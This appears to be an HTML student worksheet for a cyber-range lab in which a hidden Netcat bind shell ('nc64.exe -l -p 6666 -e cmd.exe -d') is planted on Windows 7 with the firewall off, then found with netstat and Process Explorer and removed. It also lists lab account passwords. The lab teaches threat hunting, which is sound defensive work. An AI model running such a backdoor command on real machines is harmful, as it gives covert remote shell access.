@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 8.4.3 - Hunting a Backdoor</title>
+    <link rel="stylesheet" href="lab.css">
+</head>
+
+<body>
+
+    <a href="../index.html" class="dashboard-link">&larr; Back to Dashboard</a>
+
+    <div class="container">
+        <header>
+            <div>
+                <h1>Lab 8.4.3 - Hunting a Backdoor</h1>
+                <p style="margin: 5px 0 0; color: var(--secondary);">CYBER.ORG Range Worksheet</p>
+            </div>
+            <img src="../images/cyber.org_logo2.jpg" alt="Logo" style="height: 40px; opacity: 0.8;">
+        </header>
+
+        <div class="meta-info">
+            <div class="form-group">
+                <label for="studentName">Student Name:</label>
+                <input type="text" id="studentName" placeholder="Enter your name">
+            </div>
+            <div class="form-group">
+                <label for="date">Date:</label>
+                <input type="text" id="date" placeholder="Enter date">
+            </div>
+            <div class="form-group">
+                <label for="class">Class:</label>
+                <input type="text" id="class" placeholder="Enter class name">
+            </div>
+            <div class="form-group">
+                <label for="partner">Partner Name:</label>
+                <input type="text" id="partner" placeholder="Enter partner name">
+            </div>
+        </div>
+
+        <!-- Objectives -->
+        <div class="section">
+            <h2>Objective</h2>
+            <div class="instruction-text">
+                Examine how threat hunting tools can be applied to find and kill active malware.
+            </div>
+
+            <h3>Scenario:</h3>
+            <div class="instruction-text" style="background:#fff3cd; padding:15px; border-radius:5px;">
+                On Windows 7, Goofy's account has a copy of NetCat acting as a backdoor. Infosec (Administrator) needs
+                to identify the running backdoor using tools like NetStat, Task Manager, and Process Explorer, and then
+                stop and delete the threat.
+            </div>
+
+            <h3>Instructions:</h3>
+            <ul>
+                <li>Go to CYBER.ORG Range (https://apps.cyber.org)</li>
+                <li>Launch Kali and Windows 7. Open Windows 7.</li>
+                <li><strong>Turn off Window 7 Firewall:</strong> Start > "Firewall" > Turn off > OK.</li>
+            </ul>
+        </div>
+
+        <!-- Part 1 -->
+        <div class="section">
+            <h2>Part 1: Set up Netcat Backdoor (Student/Goofy)</h2>
+            <div class="instruction-text">
+                1. On Windows 7, Logoff. Login as <strong>Goofy</strong> (password: <strong>happy123</strong>).<br>
+                2. Open Command Prompt.<br>
+                3. Navigate to NetCat:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">cd \Users\Goofy\Downloads\NetCat</pre>
+                4. Start the listener (backdoor):
+                <pre
+                    style="background:#f4f4f4; padding:10px; border-radius:4px;">nc64.exe -l -p 6666 -e cmd.exe -d</pre>
+                (The -d option hides the window).<br><br>
+                5. <strong>Test connection (Kali):</strong> Open terminal in Kali and type:
+                <pre style="background:#f4f4f4; padding:10px; border-radius:4px;">nc -v &lt;W7 IP Address&gt; 6666</pre>
+                Wait 10-15 seconds for the connection.
+            </div>
+
+            <div class="question-block">
+                <label>Paste a screenshot of the successful Netcat connection on Kali:</label>
+                <div class="image-zone" tabindex="0" id="img-zone-1">
+                    <p>Click here and press <strong>Ctrl + V</strong> (or Cmd + V) to paste your screenshot.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Part 2 -->
+        <div class="section">
+            <h2>Part 2: Discover the Backdoor (Infosec/Admin)</h2>
+            <div class="instruction-text">
+                1. Switch User to <strong>Infosec</strong> (password: <strong>P@ssword12345!</strong>). Do NOT log off
+                Goofy.<br>
+                2. Open Command Prompt (Run as Administrator).<br>
+                3. Check connections: <code>netstat -na</code>. Notice port 6666.<br>
+                4. Check applications: <code>netstat -ab</code>. Notice <code>nc64.exe</code>.<br>
+                5. <strong>Task Manager:</strong> Open Task Manager > Processes > "Show processes from all users".<br>
+                Notice <code>nc64.exe</code> and <code>cmd.exe</code> running under user Goofy.
+            </div>
+        </div>
+
+        <!-- Part 3 -->
+        <div class="section">
+            <h2>Part 3: Investigate with Process Explorer</h2>
+            <div class="instruction-text">
+                1. Open <strong>SysInternals</strong> folder on Desktop. Run <code>procexp.exe</code> as
+                Administrator.<br>
+                2. Find <code>nc64.exe</code>. Right-click > Check VirusTotal > Yes.<br>
+                3. Click Options > VirusTotal.com > Check VirusTotal.com.<br>
+                4. Observe the score (e.g., 28/76).
+            </div>
+
+            <div class="question-block">
+                <label>Paste a screenshot of the VirusTotal score in Process Explorer:</label>
+                <div class="image-zone" tabindex="0" id="img-zone-2">
+                    <p>Click here and press <strong>Ctrl + V</strong> (or Cmd + V) to paste your screenshot.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Part 4 -->
+        <div class="section">
+            <h2>Part 4: Remediation</h2>
+            <div class="instruction-text">
+                1. <strong>Kill Process:</strong> In Process Explorer, right-click <code>nc64.exe</code> > Kill Process.
+                Do the same for the rogue <code>cmd.exe</code>.<br>
+                2. <strong>Delete Files:</strong> Open File Explorer > Computer > Users > Goofy > Downloads. Delete
+                <code>NetCat</code> folder.<br>
+                3. Empty Recycle Bin.<br>
+                4. Verify it's gone: Run <code>netstat -ab</code> in Admin Command Prompt. NetCat should not appear.
+            </div>
+        </div>
+
+        <!-- Closing Questions -->
+        <div class="section" style="border-bottom: none;">
+            <h2>Closing Question</h2>
+
+            <div class="question-block">
+                <label for="q4">Why was it important to "Show processes from all users" in Task Manager?</label>
+                <textarea id="q4" rows="3" placeholder="Explain your answer..."></textarea>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="controls">
+        <button class="btn" onclick="window.print()">Save as PDF / Print</button>
+    </div>
+
+    <script src="lab.js"></script>
+</body>
+
+</html>
